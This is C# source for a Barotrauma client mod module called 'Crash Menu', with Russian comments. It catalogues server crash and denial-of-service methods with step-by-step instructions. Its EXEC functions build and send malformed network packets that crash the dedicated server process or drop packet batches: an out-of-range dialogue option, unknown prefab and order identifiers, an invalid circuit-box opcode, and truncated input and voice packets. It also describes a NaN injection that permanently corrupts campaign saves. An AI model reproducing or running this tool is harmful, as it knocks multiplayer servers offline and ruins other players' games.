using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SERVER CRASH MENU (волна 594) — ВСЕ краши сервера из 594 волн
    //  в одном меню. Разделено на классы:
    //
    //  [INSTANT]  — сервер умирает СРАЗУ (процесс)
    //  [CRASHLOOP]- сервер умирает циклом на след. тике (персистентно)
    //  [DOS]      — процесс жив, но батч пакетов отбрасывается = лаг/десинк
    //  [PERM]     — нужно право сервера (без перма не сработает)
    //  [SAVE]     — порча сохраняется в кампанию (после краша остаётся)
    //
    //  КЛИК по строке = описание СПОСОБ + ЧТО ДЕЛАТЬ.
    //  Кнопка EXEC — у выбранного метода, если он автоматизирован.
    //
    //  ГЛАВНОЕ ОТЛИЧИЕ: [INSTANT]/[CRASHLOOP] убивают процесс выделенного
    //  сервера (сервер ОФФЛАЙН для всех). [DOS] — только «заикание»
    //  (батч-дроп через catch-all в LidgrenServerPeer.Update, волна 585).
    // ============================================================
    public class ServerCrashMenuModule : CSModuleBase
    {
        public override string Id   => "crash_menu";
        public override string Name => "Crash Menu";
        public override string Description =>
            "ВСЕ краши сервера из 594 волн.\n\n" +
            "• Клик по строке = способ + что делать\n" +
            "• Кнопка EXEC — где краш автоматизирован\n" +
            "• [INSTANT] — процесс сервера умирает сразу\n" +
            "• [CRASHLOOP] — умирает циклом на след. тик\n" +
            "• [DOS] — батч-дроп (лаг), процесс жив\n" +
            "• Тестируй ТОЛЬКО на своём сервере!";

        public override string Category => "exploit";

        private static readonly Color InstColor  = new Color(255, 90, 90);
        private static readonly Color LoopColor  = new Color(255, 150, 60);
        private static readonly Color DosColor   = new Color(255, 220, 90);
        private static readonly Color PermColor  = new Color(170, 150, 255);
        private static readonly Color SaveColor  = new Color(120, 220, 255);
        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color RowColor   = new Color(30, 36, 48);
        private static readonly Color SelColor   = new Color(90, 40, 40);
        private static readonly Color AccentColor= new Color(255, 170, 90);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _desc;
        private static GUIButton _execBtn;

        private static int _selected = -1;

        // ---- реестр методов ----
        private class CrashMethod
        {
            public string Title;
            public Color TagColor;
            public string Desc;
            public Func<string> Exec;   // null = только справочник
        }

        private static readonly CrashMethod[] Methods = new CrashMethod[]
        {
            // ============ INSTANT / CRASHLOOP ============
            new CrashMethod
            {
                Title = "[INSTANT] DescriptionTag (Property Editor)",
                TagColor = InstColor,
                Desc =
"★ ПОДТВЕРЖДЕНО ЮЗЕРОМ: сервер умирает СРАЗУ.\n\n" +
"ЧТО ДЕЛАТЬ:\n" +
"1) Открой модуль PROPERTY EDITOR.\n" +
"2) Выбери любой предмет с редактируемыми свойствами.\n" +
"3) Найди свойство DescriptionTag, впиши ЛЮБОЙ текст, примени.\n\n" +
"МЕХАНИКА: сеттер Item.DescriptionTag на сервере зовёт\n" +
"TextManager.Get(твой текст) и сразу рассылает ChangeProperty\n" +
"всем клиентам — выброс вылетает за пределы сетевого catch-all.\n\n" +
"УСЛОВИЯ: CanClientAccess предмета (свой/рядом). Нужен наш\n" +
"PropertyEditorModule (кнопка в меню CSHUB).",
                Exec = null
            },
            new CrashMethod
            {
                Title = "[CRASHLOOP] EventManager selectedOption",
                TagColor = LoopColor,
                Desc =
"★ ЕДИНСТВЕННЫЙ ПОЛНЫЙ КОД-КРАШ (волна 584).\n\n" +
"ЧТО ДЕЛАТЬ:\n" +
"1) Нужен активный СОБЫТИЙНЫЙ ДИАЛОГ, таргетящий тебя\n" +
"   (разговор NPC на аутпосте, вопрос с вариантами).\n" +
"2) Жми EXEC — уйдёт пакет ответа с option=200 (> числа опций).\n" +
"3) Первый throw сервер молча глотает, НО option=200 остаётся\n" +
"   в состоянии диалога → КАЖДЫЙ КАДР ConversationAction.IsFinished\n" +
"   кидает IndexOutOfRange → вокруг игрового цикла catch НЕТ →\n" +
"   процесс dedicated server падает НА СЛЕДУЮЩЕМ ТИКЕ.\n\n" +
"ПАКЕТ: EVENTMANAGER_RESPONSE: u16 actionId + byte 200.\n" +
"ГЕЙТ: ты в TargetClients диалога (смотри вопрос — он твой).\n\n" +
"СОЛО: provoke диалог можно на своём сервере (события аутпоста).",
                Exec = ExecEventManagerCrash
            },

            // ============ DOS (батч-дроп, процесс жив) ============
            new CrashMethod
            {
                Title = "[DOS] SoldItems: несуществующий префаб",
                TagColor = DosColor,
                Desc =
"Волна 42. Лучший безправный DoS: throw НА САМОМ ВЕРХУ\n" +
"кампейн-чтения (строка 854) ДО всяких перм/проверок.\n\n" +
"ЧТО ДЕЛАТЬ: жми EXEC — уйдёт SERVER_COMMAND(ManageCampaign)\n" +
"со списком проданного, где префаб 'zzz_nonexistent'.\n" +
"Сервер: ItemPrefab.Prefabs[unknown] → KeyNotFoundException\n" +
"→ Lidgren catch-all глотает → БАТЧ пакетов отброшен.\n\n" +
"ЭФФЕКТ: спам кнопкой = сервер лагает/десинхронится у всех.\n" +
"УСЛОВИЯ: кампания на сервере (ты в лобби или в раунде).",
                Exec = ExecSoldPrefabDoS
            },
            new CrashMethod
            {
                Title = "[DOS] CircuitBox: левый opcode",
                TagColor = DosColor,
                Desc =
"Волна 26. Прямой пакет CIRCUITBOX с не-Cursor opcode.\n\n" +
"ЧТО ДЕЛАТЬ: жми EXEC — сервер прочитает header с\n" +
"Opcode=AddComponent и свитч бросит ArgumentOutOfRangeException\n" +
"(клиенты ванилью так никогда не шлют).\n\n" +
"ЭФФЕКТ: батч-дроп. Спам = лаг.\n" +
"УСЛОВИЯ: любые (даже лобби).",
                Exec = ExecCircuitBoxDoS
            },
            new CrashMethod
            {
                Title = "[DOS] Чат: несуществующий ордер",
                TagColor = DosColor,
                Desc =
"Волна 30. ORDER-чат с неизвестным identifier ордера.\n\n" +
"ЧТО ДЕЛАТЬ: жми EXEC — уйдёт ORDER-чат с id 'zzz_nonexistent_order'.\n" +
"Сервер в ReadOrder: OrderPrefab.Prefabs[unknown] → throw\n" +
"(ДО проверки спама/ID/перм). Батч-дроп.\n\n" +
"ЭФФЕКТ: спам = лаг. Работает ИЗ ЛОББИ (Update_LOBBY сегмент).\n" +
"БЕЗ всяких условий.",
                Exec = ExecChatOrderDoS
            },
            new CrashMethod
            {
                Title = "[DOS] CharacterInput: count=255",
                TagColor = DosColor,
                Desc =
"Волна 35. Инпут-пакет с count=255 и пустым хвостом.\n\n" +
"ЧТО ДЕЛАТЬ: жми EXEC — UPDATE_INGAME сегмент CharacterInput:\n" +
"u16 updateID + byte 255 и ОБРЫВ. Сервер читает 255 инпутов\n" +
"за краем пакета → throw. Батч-дроп.\n\n" +
"УСЛОВИЯ: ты в раунде (GameStarted) и имеешь персонажа.",
                Exec = ExecCharInputDoS
            },
            new CrashMethod
            {
                Title = "[DOS] VOIP: обрезанный пакет",
                TagColor = DosColor,
                Desc =
"Волна 28 + 451. VOIP-пакет: заявлены 8 буферов по 255 байт,\n" +
"данных нет. BlockCopy читает за краем → throw. Батч-дроп.\n" +
"(Вариант волны 451: 1 байт TOC → OpusException → дроп тика.)\n\n" +
"ЧТО ДЕЛАТЬ: жми EXEC. УСЛОВИЯ: VoiceChatEnabled на сервере,\n" +
"ты не в муте, ты подключён (даже лобби).",
                Exec = ExecVoipDoS
            },

            // ============ СПРАВОЧНИК (без автокнопки) ============
            new CrashMethod
            {
                Title = "[DOS] SegmentTable: битые указатели",
                TagColor = DosColor,
                Desc =
"Волна 27. UPDATE_LOBBY/UPDATE_INGAME с кривой таблицей сегментов\n" +
"(указатель за пределы пакета). Сервер читает u16 numSegments и\n" +
"сегменты с мусорного смещения → IndexOutOfRange → батч-дроп.\n\n" +
"ЧТО ДЕЛАТЬ: руками — собрать UPDATE_LOBBY, после заголовка\n" +
"записать u16 65535 (указатель таблицы) и обрезать пакет.\n" +
"Автоматизация не сделана (легко ошибиться с байтами) — но и\n" +
"эффект тот же, что у кнопочных DoS.",
                Exec = null
            },
            new CrashMethod
            {
                Title = "[DOS] Inventory: receivedItemIds OOB",
                TagColor = DosColor,
                Desc =
"Волна 26. Inventory.SharedRead: байты start/end без клампа\n" +
"к вместимости, receivedItemIds[i] за границей → IndexOutOfRange\n" +
"→ батч-дроп.\n\n" +
"ЧТО ДЕЛАТЬ: InventoryState-эвент контейнера (Item ServerEventRead\n" +
"EventType=1) с мусорными индексами. Проще через наш\n" +
"PacketDump/пакетный фазер; отдельной кнопки нет.",
                Exec = null
            },
            new CrashMethod
            {
                Title = "[PERM-DOS] SelectMode: modeIndex OOB",
                TagColor = PermColor,
                Desc =
"Волна 41. SERVER_COMMAND(SelectMode): u16 modeIndex идёт\n" +
"НАПРЯМУЮ в GameModes[modeIndex] → IndexOutOfRange при\n" +
"modeIndex >= числа режимов.\n\n" +
"ЧТО ДЕЛАТЬ: пакет SERVER_COMMAND + u16 0x20 (SelectMode) +\n" +
"u16 9999. Требует ПЕРМ SelectMode (на пермлесс-сервере — кто\n" +
"угодно). Кнопки нет (у тебя обычно нет перма на чужом).",
                Exec = null
            },
            new CrashMethod
            {
                Title = "[SAVE] CircuitBox MoveComponent NaN",
                TagColor = SaveColor,
                Desc =
"Волна 523. MoveAmount = raw Vector2 БЕЗ IsValid/клампа и\n" +
"ПЕРСИСТИТСЯ В СЕЙВ. NaN в позициях компонентов цепи → вечные\n" +
"глюки/краши загрузки кампании ПОСЛЕ рестарта сервера.\n\n" +
"ЧТО ДЕЛАТЬ: наш CircuitBox NaN-путь (PropertyEditorModule →\n" +
"PumpPoison / ручной CircuitBox-пакет с MoveAmount = NaN,NaN).\n" +
"★ ОСТОРОЖНО: портит СОХРАНЕНИЕ кампании навсегда — только\n" +
"на своём сервере/тест-кампании!",
                Exec = null
            }
        };

        public override string GetLabel() => "Crash Menu 💥";

        public override void OnClick()
        {
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _selected = -1;
                _window = new GUIMessageBox("Server Crash Menu", "", Array.Empty<LocalizedString>(), new Vector2(0.78f, 0.9f));
                var content = _window.Content;
                content.ClearChildren();

                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.46f), content.RectTransform));
                _list.Color = new Color(20, 25, 35);
                foreach (CrashMethod m in Methods)
                {
                    CrashMethod mm = m;
                    int idx = Array.IndexOf(Methods, m);
                    var row = new GUIButton(
                        new RectTransform(new Vector2(1f, 0.075f), _list.Content.RectTransform), mm.Title);
                    row.Color = RowColor;
                    row.OnClicked = (b, d) =>
                    {
                        SelectMethod(idx);
                        return true;
                    };
                }

                _desc = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.44f), content.RectTransform, Anchor.BottomCenter)
                        { RelativeOffset = new Vector2(0f, 0.085f) },
                    "Клик по методу выше = способ и что делать.", textAlignment: Alignment.CenterLeft);
                _desc.TextColor = AccentColor;
                _desc.CanBeFocused = false;
                try { _desc.Wrap = true; } catch { }

                var actionLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(1f, 0.07f), content.RectTransform, Anchor.BottomCenter), isHorizontal: true);
                _execBtn = new GUIButton(new RectTransform(new Vector2(0.5f, 0.95f), actionLayout.RectTransform), "EXEC ✖");
                _execBtn.Color = SelColor;
                _execBtn.Visible = false;
                _execBtn.OnClicked = (b, d) => { RunExec(); return true; };
                var closeBtn = new GUIButton(new RectTransform(new Vector2(0.48f, 0.95f), actionLayout.RectTransform), "Закрыть");
                closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void SelectMethod(int idx)
        {
            _selected = idx;
            if (_desc == null || idx < 0 || idx >= Methods.Length) { return; }
            _desc.Text = Methods[idx].Title + "\n─────────────────────────────\n" + Methods[idx].Desc;
            _desc.TextColor = Methods[idx].TagColor;
            if (_execBtn != null) { _execBtn.Visible = Methods[idx].Exec != null; }
        }

        private static void RunExec()
        {
            if (_selected < 0 || _selected >= Methods.Length) { return; }
            Func<string> exec = Methods[_selected].Exec;
            if (exec == null) { return; }
            try
            {
                string result = exec();
                GUI.AddMessage("[CrashMenu] " + result, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] exec fail: " + e.Message, DangerColor);
            }
        }

        // ========================================================
        //  1) EVENTMANAGER selectedOption CRASHLOOP (волна 584)
        // ========================================================
        private static string ExecEventManagerCrash()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
            msg.WriteUInt16(0x7FFF);   // actionId — любой
            msg.WriteByte(200);        // selectedOption >> Options.Count
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "EVENTMANAGER packet отправлен (option=200). Работает ТОЛЬКО если тебя таргетит активный диалог!";
        }

        // ========================================================
        //  2) SoldItems unknown prefab DoS (волна 42)
        // ========================================================
        private static string ExecSoldPrefabDoS()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
                msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);

                ushort locIndex = 0;
                try
                {
                    var loc = GameMain.GameSession?.Campaign?.Map?.CurrentLocation;
                    if (loc != null) { locIndex = (ushort)loc.LocationIndex; }
                }
                catch { }
                msg.WriteUInt16(locIndex);        // currentLocIndex
                msg.WriteUInt16(locIndex);        // selectedLocIndex
                msg.WriteByte(0);                 // missionCount
                msg.WriteBoolean(false);          // hull repairs
                msg.WriteBoolean(false);          // item repairs
                msg.WriteBoolean(false);          // lost shuttle

                msg.WriteByte(0);                 // buyCrate stores
                msg.WriteByte(0);                 // subSellCrate stores
                msg.WriteByte(0);                 // purchased stores

                // soldItems: 1 store, 1 item, НЕСУЩЕСТВУЮЩИЙ префаб
                msg.WriteByte(1);
                msg.WriteIdentifier("a".ToIdentifier());
                msg.WriteUInt16(1);
                msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
                msg.WriteUInt16(0);               // itemId
                msg.WriteBoolean(false);          // removed
                msg.WriteByte(0);                 // sellerId
                msg.WriteByte(0);                 // origin

                msg.WriteUInt16(0);               // upgrades
                msg.WriteUInt16(0);               // swaps

                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                return "SoldItems-bomb отправлена (throw на строке 854, до всех проверок)";
            }
            catch (Exception e)
            {
                return "send fail: " + e.Message;
            }
        }

        // ========================================================
        //  3) CircuitBox левый opcode DoS (волна 26)
        // ========================================================
        private static string ExecCircuitBoxDoS()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
                INetSerializableStruct header = new NetCircuitBoxHeader(
                    (CircuitBoxOpcode)2, 1, 0);   // 2 = AddComponent (не Cursor!)
                ((INetSerializableStruct)header).Write(msg);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                return "CircuitBox opcode-bomb отправлена (switch бросит ArgumentOutOfRange)";
            }
            catch (Exception e)
            {
                return "send fail (нет доступа к NetCircuitBoxHeader?): " + e.Message;
            }
        }

        // ========================================================
        //  4) Чат: несуществующий ордер DoS (волна 30) — из лобби!
        // ========================================================
        private static string ExecChatOrderDoS()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                    msg.WriteUInt16(1);                                   // NetStateID
                    msg.WriteRangedInteger((int)ChatMessageType.Order, 0, 12);
                    msg.WriteRangedInteger((int)ChatMode.None, 0, 2);
                    msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                    msg.WriteUInt16(0);                                   // targetChar
                    msg.WriteUInt16(0);                                   // targetEntity
                    msg.WriteByte(0);                                     // optionIndex
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                return "ORDER-bomb отправлена (throw в ReadOrder, работает из лобби)";
            }
            catch (Exception e)
            {
                return "send fail: " + e.Message;
            }
        }

        // ========================================================
        //  5) CharacterInput count=255 DoS (волна 35)
        // ========================================================
        private static string ExecCharInputDoS()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            if (GameMain.GameSession == null || !GameMain.Client.GameStarted || Character.Controlled == null)
            { return "нужно быть в раунде с персонажем"; }
            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
                msg.WriteBoolean(true);           // midroundSyncingDone
                msg.WritePadBits();
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                    msg.WriteUInt16(1);           // networkUpdateID
                    msg.WriteByte(255);           // inputCount=255, данных НЕТ
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                return "Input-bomb отправлена (чтение 255 инпутов за краем пакета)";
            }
            catch (Exception e)
            {
                return "send fail: " + e.Message;
            }
        }

        // ========================================================
        //  6) VOIP обрезанный пакет DoS (волна 28/451)
        // ========================================================
        private static string ExecVoipDoS()
        {
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            try
            {
                byte mySession = 0;
                try { mySession = GameMain.Client.SessionId; } catch { }

                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.VOICE);
                msg.WriteByte(mySession);
                for (int i = 0; i < 8; i++) { msg.WriteByte(255); }   // 8 буферов по 255 байт...
                // ...данных нет → BlockCopy за краем → throw
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
                return "VOIP-bomb отправлена (8×255 байт заявлено, 0 байт данных)";
            }
            catch (Exception e)
            {
                return "send fail: " + e.Message;
            }
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _desc = null;
            _execBtn = null;
            _selected = -1;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
